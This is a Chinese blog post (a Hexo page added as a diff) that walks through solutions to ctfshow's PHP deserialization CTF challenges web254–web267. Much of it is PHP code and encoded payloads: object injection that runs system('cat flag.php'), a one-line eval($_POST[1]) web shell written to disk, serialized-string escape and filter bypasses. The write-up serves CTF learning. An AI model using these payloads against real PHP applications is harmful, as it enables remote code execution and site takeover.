@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>php反序列化(ctfshow) | Secfeng</title>
+  <meta name="keywords" content=" php ">
+  <meta name="description" content="php反序列化(ctfshow) | Secfeng">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:site_name" content="Secfeng">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-05T11:53:12.000Z">
+<meta property="article:modified_time" content="2023-03-28T14:09:40.008Z">
+<meta property="article:author" content="Secfeng">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Secfeng</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/secfeng"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(15)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="15">
+<input type="hidden" id="yelog_site_word_count" value="27.7k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>rce</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>yii</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="yii"
+           data-author="" >
+            <span class="post-title" title="yii2框架反序列化漏洞复现">yii2框架反序列化漏洞复现</span>
+            <span class="post-date" title="2023-05-29 16:22:42">2023/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化">php反序列化</span>
+            <span class="post-date" title="2023-05-27 20:16:39">2023/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化(ctfshow)">php反序列化(ctfshow)</span>
+            <span class="post-date" title="2023-05-09 20:42:55">2023/05/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(%E6%B7%B7%E5%90%88)/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含(混合)">文件包含(混合)</span>
+            <span class="post-date" title="2023-04-25 15:59:18">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含(ctfshow)">文件包含(ctfshow)</span>
+            <span class="post-date" title="2023-04-25 10:39:55">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(%E6%B7%B7%E5%90%88)/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传(混合)">文件上传(混合)</span>
+            <span class="post-date" title="2023-04-23 19:50:53">2023/04/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传(upload-labs)">文件上传(upload-labs)</span>
+            <span class="post-date" title="2023-04-19 14:08:07">2023/04/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(%E6%B7%B7%E5%90%88)/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="命令执行(混合)">命令执行(混合)</span>
+            <span class="post-date" title="2023-04-16 21:26:25">2023/04/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/"
+           data-tag="sql"
+           data-author="" >
+            <span class="post-title" title="sql注入(混合)">sql注入(混合)</span>
+            <span class="post-date" title="2023-04-16 21:23:53">2023/04/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"
+           data-tag="linux"
+           data-author="" >
+            <span class="post-title" title="linux学习">linux学习</span>
+            <span class="post-date" title="2023-04-14 22:24:49">2023/04/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="命令执行(ctfshow)">命令执行(ctfshow)</span>
+            <span class="post-date" title="2023-04-09 19:52:07">2023/04/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php伪协议">php伪协议</span>
+            <span class="post-date" title="2023-04-04 22:21:18">2023/04/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php特性(ctfshow)">php特性(ctfshow)</span>
+            <span class="post-date" title="2023-04-03 15:56:51">2023/04/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/03/28/xss%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xss常见的触发标签">xss常见的触发标签</span>
+            <span class="post-date" title="2023-03-28 20:37:01">2023/03/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/03/28/xsslabs/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xsslabs">xsslabs</span>
+            <span class="post-date" title="2023-03-28 16:24:23">2023/03/28</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-php反序列化(ctfshow)" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">php反序列化(ctfshow)</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">php</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2023-05-27 22:03:42'>2023-05-09 20:42</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:2.3k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web254"><span class="toc-text">web254</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web255"><span class="toc-text">web255</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web256"><span class="toc-text">web256</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web257"><span class="toc-text">web257</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web258"><span class="toc-text">web258</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web259"><span class="toc-text">web259*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web260"><span class="toc-text">web260</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web261"><span class="toc-text">web261</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web262"><span class="toc-text">web262</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web263"><span class="toc-text">web263</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web264-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-text">web264 反序列化字符串逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web265-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8"><span class="toc-text">web265 反序列化中指针引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web266-php%E4%B8%8D%E5%8C%BA%E5%88%86%E7%B1%BB%E5%90%8D%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="toc-text">web266 php不区分类名的大小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web267"><span class="toc-text">web267</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><p>这关好像和反序列化没什么关系</p>
+<pre><code>payload ?username=xxxxxx&amp;password=xxxxxx
+</code></pre>
+<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/223653.png" class="">
+
+<p>这里让我们让反序列后的结果是ctfShowUser的实例化对象。又因为只有$this-&gt;isVip是true才能是flag，所以反序列化的内容为</p>
+<pre><code>&lt;?php
+class ctfShowUser&#123;
+    public $isVip=true;
+&#125;
+$a= serialize(new ctfShowUser());
+//O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;isVip&quot;;b:1;&#125;
+//由于cookie中将;作为截断符号，所需要编码绕过，这里采用url编码
+echo urlencode($a);
+//O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
+</code></pre>
+<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>这关需要序列化一个username或password使其反序列化后互不相同就行了</p>
+<pre><code>&lt;?php
+class ctfShowUser&#123;
+    public $username=&#39;haha&#39;;
+    public $isVip=true;
+&#125;
+$a= serialize(new ctfShowUser());
+echo urlencode($a);
+?&gt;
+
+//运行结果
+O:11:&quot;ctfShowUser&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;haha&quot;;s:5:&quot;isVip&quot;;b:1;&#125;
+//url编码处理后：
+O%3A11%3A%22ctfShowUser%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22haha%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
+</code></pre>
+<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p><code>__construct</code>当对象被创建的时候自动调用，对对象进行初始化。当所有的操作执行完毕之后，需要释放序列化的对象，触发<code>__destruct()</code>魔术方法</p>
+<p>因此我们只需要在执行<code>__construct</code>的时候初始化backDoor类，方便我们进行命令执行的利用，之后反序列化结束后，会执行<code>__destruct()</code>,此时<code>eval($this-&gt;code);</code>等价于<code>eval(system(&#39;cat flag.php&#39;);)</code></p>
+<pre><code>&lt;?php
+error_reporting(0);
+class ctfShowUser&#123;
+    private $class = &#39;backDoor&#39;;
+    public function __construct()&#123;
+        $this-&gt;class=new backDoor();
+    &#125;
+&#125;
+class backDoor&#123;
+    private $code=&quot;system(&#39;cat flag.php&#39;);&quot;;
+    public function getInfo()&#123;
+        eval($code);
+    &#125;
+&#125;
+echo urlencode(serialize(new ctfShowUser()));
+?&gt;
+</code></pre>
+<p>最后生成反序列化的数据：</p>
+<pre><code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
+</code></pre>
+<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><p>这关多了一个正则表达式：<code>/[oc]:\d+:/i</code>。意思是过滤这两种情况：<code>o:数字:</code>与<code>c:数字:</code></p>
+<p>只需要把O后面的数字前加个加号就可以绕过了（o:+数字:）</p>
+<pre><code>&lt;?php
+class ctfShowUser&#123;
+    public $class = &#39;backDoor&#39;;
+    public function __construct()&#123;
+        $this-&gt;class=new backDoor();
+    &#125; 
+&#125; 
+class backDoor&#123;
+    public $code=&#39;system(&quot;cat f*&quot;);&#39;;
+&#125;
+$a = serialize(new ctfShowUser());
+$a = str_replace(&#39;O:&#39;,&#39;O:+&#39;,$a);
+echo urlencode($a);
+?&gt;
+//运行结果
+O:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:17:&quot;system(&quot;cat f*&quot;);&quot;;&#125;&#125;
+//URL处理
+O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D
+</code></pre>
+<h3 id="web259"><a href="#web259" class="headerlink" title="web259*"></a>web259*</h3><h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p> 这题就简单了，直接序列化一个包含”ctfshow_i_love_36D”的字符串</p>
+<pre><code>&lt;?php
+class ctf&#123;
+    public $c=&quot;ctfshow_i_love_36D&quot;;
+&#125;
+$a=serialize(new ctf());
+echo urlencode($a);
+</code></pre>
+<pre><code>payload:ctfshow&#123;3d3ba94d-0c6c-4ae8-8113-b34d15d286b9&#125;
+</code></pre>
+<h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><pre><code>注意:
+如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。
+//此特性自 PHP 7.4.0 起可用。
+</code></pre>
+<p><code>__destruct</code> 函数部分弱比较 <code>$this-&gt;code==0x36d</code>，因为 <code>$this-&gt;code = $this-&gt;username.$this-&gt;password;</code>，<code>username</code> 可控制，因为 <code>(int)&#39;877.php&#39; == 0x36d</code>，故传 <code>877.php</code> 即可绕过。</p>
+<pre><code>&lt;?php
+class ctfshowvip&#123;
+    public $username;
+    public $password=&#39;&#39;;
+    public $code=&#39;&#39;;
+    
+        public function __construct()&#123;
+        $this-&gt;username=&#39;877.php&#39;;
+        $this-&gt;password=&#39;&lt;?php eval($_POST[1]);?&gt;&#39;;
+            
+        &#125;
+    
+&#125;
+echo urlencode(serialize(new ctfshowvip()));
+?&gt;
+</code></pre>
+<pre><code>payload: vip=O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3Bs%3A0%3A%22%22%3B%7D
+</code></pre>
+<h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p>方法1：非预期</p>
+<p>因为message.php页面中的cookie我们是可控的，所以我们可以直接将序列化加密之后的字符串赋值给cookie即可。</p>
+<pre><code>&lt;?php 
+class message&#123;
+    public $token=&#39;admin&#39;;
+&#125;
+echo urlencode(base64_encode(serialize(new message(1,2,3))));
+</code></pre>
+<img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/223637.png" class="">
+
+<p>方法2：<strong>php反序列化字符串逃逸</strong></p>
+<pre><code>字符串逃逸类似于注入，逃逸有一个特征：对序列化后的字符串进行了替换、而且替换后造成了字符数量的不一致，有两种情况，一种是替换后变长，一种是替换后变短。此题将fuck替换成了loveU，所以是变长。
+</code></pre>
+<p>我们先看看这个：</p>
+<pre><code>&lt;?php
+class message&#123;
+    public $from=&#39;1&#39;;
+    public $msg=&#39;2&#39;;
+    public $to=&#39;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#39;;
+&#125;
+echo urlencode(serialize(new message()));
+//结果解码后为O:7:&quot;message&quot;:3:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:31:&quot;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;
+</code></pre>
+<p>可以看到，这里的s:31:”fuck”中fuck应该是四个字符，而这里却是31个，因为这里的31个字符包含了后面的一堆字符<code>fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>，共27个字符，而要使这里的数字于字符数对应，我们就可以用到题目给的字符串替换，将fuck替换成loveU,每替换一次就会多一个字符，不难想到，如果替换27次，那么就相当于这里将后面的常量字符串数量天衣无缝的弥补上了。</p>
+<pre><code>payload:f=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;
+</code></pre>
+<p>最后访问message.php即可</p>
+<h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p>用扫描器扫到了<a target="_blank" rel="noopener" href="http://www.zip和check.php/">www.zip和check.php</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.zip中的index.php/">www.zip中的index.php</a>:</p>
+<img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/205319.png" class="">
+
+<p>我们可以通过修改 <code>$COOKIE[&#39;limit&#39;]</code> 来控制 <code>session</code> 的内容。</p>
+<p>inc&#x2F;inc.php:</p>
+<pre><code>
+&lt;?php
+...
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+session_start();
+...
+class User&#123;
+    public $username;
+    public $password;
+    public $status;
+    function __construct($username,$password)&#123;
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    &#125;
+    function setStatus($s)&#123;
+        $this-&gt;status=$s;
+    &#125;
+    function __destruct()&#123;
+        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));
+    &#125;
+&#125;
+...
+</code></pre>
+<p>我们需要知道session_start()这个函数已经这个函数所起的作用：</p>
+<p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p>
+<p>这里使用 <code>ini_set</code> 指定了 <code>serialize_handler</code> 为 <code>php</code>，如果默认的 <code>serialize_handler</code> 为 <code>php_serialize</code>，就可以通过在序列化的字符串之前加 <code>|</code>，反序列化任意对象。</p>
+<pre><code>php_binary: 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
+php: 存储方式是，键名+竖线+经过serialize()函数序列处理的值
+php_serialize(php&gt;5.5.4): 存储方式是，经过serialize()函数序列化处理的值
+</code></pre>
+<p>注意：在 <code>php 5.5.4</code> 以前默认选择的是 <code>php</code>，<code>5.5.4</code> 之后就是 <code>php_serialize</code>，这里的 <code>php</code> 版本为 <code>7.3.11</code>，那么默认就是 <code>php_serialize</code>。</p>
+<p>那么思路就很清晰了，首先在 <code>$COOKIE[&#39;limit&#39;]</code> 中构造 <code>|+序列化对象</code> 的字符串，访问首页写入 <code>session</code>，再通过 <code>check.php</code> 加载的 <code>inc.php</code> 中的 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> 将 <code>session</code> 以 <code>session.serialize_handler=php</code> 的格式反序列化，执行 <code>User</code> 类的 <code>__destruct</code> 方法写 <code>shell</code>。</p>
+<p>首先构造payload:</p>
+<pre><code>&lt;?php
+class User&#123;
+    public $username = &quot;c.php&quot;;
+    public $password = &quot;&lt;?php @eval($_POST[1]); ?&gt;&quot;;
+    public $status;
+&#125;
+$a = new User();
+$target = &#39;|&#39;.serialize($a);
+var_dump(urlencode(base64_encode($target)));
+//fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJjLnBocCI7czo4OiJwYXNzd29yZCI7czoyNjoiPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4iO3M6Njoic3RhdHVzIjtOO30%3D
+</code></pre>
+<p>更改 <code>cookie</code> 后访问 <code>index.php</code>,然后访问check.php或inc&#x2F;inc.php进行反序列化，最后访问log-c.php传参即可</p>
+<h3 id="web264-反序列化字符串逃逸"><a href="#web264-反序列化字符串逃逸" class="headerlink" title="web264 反序列化字符串逃逸"></a>web264 反序列化字符串逃逸</h3><p>与262关不同的是这里用的是session，所以不能非预期了</p>
+<p>反序列化字符串逃逸：</p>
+<pre><code>f=1&amp;m=2&amp;t=3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;
+</code></pre>
+<p>访问message.php时还需要在cookie中添加msg，值任意</p>
+<h3 id="web265-反序列化中指针引用"><a href="#web265-反序列化中指针引用" class="headerlink" title="web265 反序列化中指针引用"></a>web265 反序列化中指针引用</h3><p>token的值是一个随机值，我们要想传值给password，使其与token相等是不可能的，那么就只有把password的地址传给token，使password跟着token的改变而改变。</p>
+<pre><code>&lt;?php
+class ctfshowAdmin&#123;
+    public $token=1;
+    public $password=1;
+&#125;
+$a = new ctfshowAdmin();
+$a-&gt;password=&amp;$a-&gt;token;//让passwd的值随token变
+echo serialize($a);
+//运行结果
+O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;i:1;s:8:&quot;password&quot;;R:2;&#125;
+</code></pre>
+<h3 id="web266-php不区分类名的大小写"><a href="#web266-php不区分类名的大小写" class="headerlink" title="web266 php不区分类名的大小写"></a>web266 php不区分类名的大小写</h3><p>php中：</p>
+<pre><code>区分大小写的： 变量名、常量名、数组索引（键名key）
+
+不区分大小写的：函数名、方法名、类名、魔术常量、NULL、FALSE、TRUE
+</code></pre>
+<p>所以这道题解法呼之欲出：因为正则表达式区分了大小写，所以我们可以使用大小写绕过，然后反序列化ctfshow类，这样就不会报错，脚本正常结束之后，就很调用__destruct()魔法方法，输出flag。</p>
+<pre><code>&lt;?php
+class Ctfshow&#123;
+    
+&#125;
+echo serialize(new Ctfshow());
+//O:7:&quot;Ctfshow&quot;:0:&#123;&#125;
+</code></pre>
+<img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/114148.png" class="">
+
+<h3 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h3>
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023-2026 Secfeng
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
